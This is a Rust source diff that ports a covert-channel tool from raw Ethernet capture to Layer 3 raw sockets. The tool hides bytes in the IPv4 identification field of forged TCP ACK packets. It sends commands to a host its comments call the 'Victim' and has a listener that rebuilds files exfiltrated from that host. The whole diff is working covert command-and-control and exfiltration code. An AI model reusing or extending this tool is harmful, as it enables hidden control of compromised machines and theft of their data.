@@ -1,17 +1,16 @@
 use pnet::packet::ip::IpNextHeaderProtocols;
-use pnet::packet::ethernet::{EthernetPacket, EtherTypes};
 use pnet::packet::ipv4::{MutableIpv4Packet, Ipv4Packet, checksum};
 use pnet::packet::tcp::{MutableTcpPacket, TcpFlags, TcpPacket, ipv4_checksum};
 use pnet::packet::Packet;
 use std::net::Ipv4Addr;
-use pnet::datalink::{DataLinkSender, DataLinkReceiver, NetworkInterface, channel, Channel};
+// CHANGED: Use transport instead of datalink
+use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
 use std::sync::atomic::{AtomicU16, AtomicBool, Ordering};
 use std::sync::Arc;
 use std::thread;
 use std::time::Duration;
 use std::io::{self, Write};
 
-// These MUST be public so main.rs can see them for command logic
 pub const CMD_EOF: u8 = 0x41;
 pub const CMD_START_TRANSFER: u8 = 0x40;
 
@@ -26,21 +25,23 @@ pub struct ChannelConfig {
 
 pub struct CovertChannel {
     pub config: Arc<ChannelConfig>,
-    pub tx: Box<dyn DataLinkSender>,
+    pub tx: Box<dyn TransportSender>, // CHANGED: TransportSender
     pub running: Arc<AtomicBool>, 
 }
 
 impl CovertChannel {
     pub fn new(
-        interface: &NetworkInterface,
+        _interface: &pnet::datalink::NetworkInterface, // Interface kept for compatibility
         target_ip: Ipv4Addr,
         local_ip: Ipv4Addr,
         send_port: u16,
         listen_port: u16,
-    ) -> (Self, Box<dyn DataLinkReceiver>) {
-        let (tx, rx) = match channel(interface, Default::default()) {
-            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
-            _ => panic!("[!] Failed to open raw channel. Run with sudo/root privileges."),
+    ) -> (Self, TransportReceiver) {
+        // CHANGED: Open a Layer 3 Transport Channel for TCP
+        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
+        let (tx, rx) = match transport_channel(4096, protocol) {
+            Ok((tx, rx)) => (tx, rx),
+            Err(e) => panic!("[!] Failed to open L3 channel: {}. Run with sudo/root.", e),
         };
 
         let config = Arc::new(ChannelConfig {
@@ -57,12 +58,12 @@ impl CovertChannel {
         }, rx)
     }
 
-    /// Signals the listener thread to shut down
     pub fn stop(&self) {
         self.running.store(false, Ordering::Relaxed);
     }
 
     pub fn send_byte(&mut self, byte: u8) {
+        // At Layer 3, we build the IP header and TCP header together
         let mut buffer = [0u8; 40];
         let (ip_slice, tcp_slice) = buffer.split_at_mut(20);
 
@@ -74,22 +75,18 @@ impl CovertChannel {
         ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
         ip_packet.set_source(self.config.local_ip);
         ip_packet.set_destination(self.config.target_ip);
-        ip_packet.set_flags(2); // Set Don't Fragment
-
-        // Encode data in the lower 8 bits of IPID
+        
+        // Encode data in IPID lower bits
         let current_count = IPID_COUNTER.fetch_add(1, Ordering::Relaxed);
-        let upper = (current_count & 0x00FF) << 8;
-        let covert_id = upper | (byte as u16);
+        let covert_id = ((current_count & 0xFF00)) | (byte as u16);
         ip_packet.set_identification(covert_id);
 
         let mut tcp_packet = MutableTcpPacket::new(tcp_slice).unwrap();
         tcp_packet.set_source(self.config.listen_port); 
         tcp_packet.set_destination(self.config.send_port);
+        tcp_packet.set_flags(TcpFlags::ACK);
         tcp_packet.set_window(64240);
         tcp_packet.set_data_offset(5);
-        tcp_packet.set_flags(TcpFlags::ACK);
-        tcp_packet.set_sequence(0x11111111);
-        tcp_packet.set_acknowledgement(0x22222222);
 
         let tcp_checksum = ipv4_checksum(&tcp_packet.to_immutable(), &self.config.local_ip, &self.config.target_ip);
         tcp_packet.set_checksum(tcp_checksum);
@@ -97,7 +94,8 @@ impl CovertChannel {
         let ip_checksum = checksum(&ip_packet.to_immutable());
         ip_packet.set_checksum(ip_checksum);
 
-        let _ = self.tx.send_to(ip_packet.packet(), None);
+        // Send to target IP address
+        let _ = self.tx.send_to(ip_packet, std::net::IpAddr::V4(self.config.target_ip));
     }
 
     pub fn send_command(&mut self, cmd: &str) {
@@ -109,58 +107,49 @@ impl CovertChannel {
     }
 }
 
-pub fn start_listening(mut rx: Box<dyn DataLinkReceiver>, config: Arc<ChannelConfig>, running: Arc<AtomicBool>) {
+pub fn start_listening(mut rx: TransportReceiver, config: Arc<ChannelConfig>, running: Arc<AtomicBool>) {
     thread::spawn(move || {
         let mut binary_mode = false;
         let mut file_data = Vec::new();
+        
+        // Create an iterator over IPv4 packets
+        let mut iter = pnet::transport::ipv4_packet_iter(&mut rx);
 
-        println!("[*] Covert Listener Active. Monitoring incoming traffic...");
+        println!("[*] L3 Covert Listener Active.");
 
         while running.load(Ordering::Relaxed) {
-            match rx.next() {
-                Ok(packet) => {
-                    // Use EthernetPacket to handle link-layer offset automatically (solves wlp8s0 issues)
-                    if let Some(eth) = EthernetPacket::new(packet) {
-                        if eth.get_ethertype() == EtherTypes::Ipv4 {
-                            if let Some(ip) = Ipv4Packet::new(eth.payload()) {
-                                // Filter by Victim IP and ensure it's TCP
-                                if ip.get_source() == config.target_ip && ip.get_next_level_protocol() == IpNextHeaderProtocols::Tcp {
-                                    if let Some(tcp) = TcpPacket::new(ip.payload()) {
-                                        // Ensure packet is destined for our designated RX port
-                                        if tcp.get_destination() == config.listen_port {
-                                            let byte = (ip.get_identification() & 0x00FF) as u8;
-                                            
-                                            match byte {
-                                                CMD_START_TRANSFER => {
-                                                    binary_mode = true;
-                                                    file_data.clear();
-                                                    println!("\n[!] File transfer started...");
-                                                },
-                                                CMD_EOF => {
-                                                    if binary_mode {
-                                                        println!("\n[+] Transfer complete. Received {} bytes.", file_data.len());
-                                                        binary_mode = false;
-                                                    }
-                                                },
-                                                _ => {
-                                                    if binary_mode {
-                                                        file_data.push(byte);
-                                                    } else {
-                                                        print!("{}", byte as char);
-                                                        let _ = io::stdout().flush();
-                                                    }
-                                                }
-                                            }
-                                        }
+            // CHANGED: Use the L3 iterator. No more manual Ethernet offset math.
+            if let Ok((ip, _)) = iter.next() {
+                if ip.get_source() == config.target_ip && ip.get_next_level_protocol() == IpNextHeaderProtocols::Tcp {
+                    if let Some(tcp) = TcpPacket::new(ip.payload()) {
+                        if tcp.get_destination() == config.listen_port {
+                            let byte = (ip.get_identification() & 0x00FF) as u8;
+                            
+                            match byte {
+                                CMD_START_TRANSFER => {
+                                    binary_mode = true;
+                                    file_data.clear();
+                                    println!("\n[!] File transfer started...");
+                                },
+                                CMD_EOF => {
+                                    if binary_mode {
+                                        println!("\n[+] Received {} bytes.", file_data.len());
+                                        binary_mode = false;
+                                    }
+                                },
+                                _ => {
+                                    if binary_mode {
+                                        file_data.push(byte);
+                                    } else {
+                                        print!("{}", byte as char);
+                                        let _ = io::stdout().flush();
                                     }
                                 }
                             }
                         }
                     }
                 }
-                Err(_) => continue,
             }
         }
-        println!("\n[*] Listener thread exiting gracefully.");
     });
 }
